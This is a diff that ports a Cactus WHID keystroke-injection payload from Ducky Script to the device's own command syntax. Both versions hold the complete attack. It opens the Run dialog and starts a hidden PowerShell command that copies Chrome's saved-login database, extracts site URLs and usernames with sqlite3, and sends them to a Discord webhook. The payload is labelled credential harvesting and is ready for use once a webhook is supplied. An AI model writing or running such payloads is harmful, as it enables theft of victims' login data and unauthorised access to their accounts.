@@ -1,11 +1,9 @@
-REM === Cactus WHID Payload: Chrome Saved Login URLs Exfil ===
-REM Target: Windows 10/11 (Chrome installed)
-REM Category: Credential Harvesting
-REM Description: Extracts URLs and usernames from Chrome Login Data db, exfils to Discord
-REM Note: Passwords are DPAPI-encrypted; this grabs the URL+username mapping
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$src=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\";$dst=\"$env:TEMP\ld.db\";Copy-Item $src $dst -Force;$q='SELECT origin_url,username_value FROM logins WHERE username_value != \"\"';$out=& sqlite3.exe $dst $q 2>$null;if(!$out){$out='No sqlite3 or no data'};$body=@{content=\"``````$($out|Out-String)``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body;Remove-Item $dst"
-ENTER
+Rem: Cactus WHID Payload - Chrome Saved Login URLs Exfil
+Rem: Target - Windows 10/11 (Chrome installed)
+Rem: Extracts URLs and usernames from Chrome Login Data db, exfils to Discord
+Rem: Passwords are DPAPI-encrypted - this grabs the URL+username mapping
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$src=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\";$dst=\"$env:TEMP\ld.db\";Copy-Item $src $dst -Force;$q='SELECT origin_url,username_value FROM logins WHERE username_value != \"\"';$out=& sqlite3.exe $dst $q 2>$null;if(!$out){$out='No sqlite3 or no data'};$body=@{content=\"``````$($out|Out-String)``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body;Remove-Item $dst"
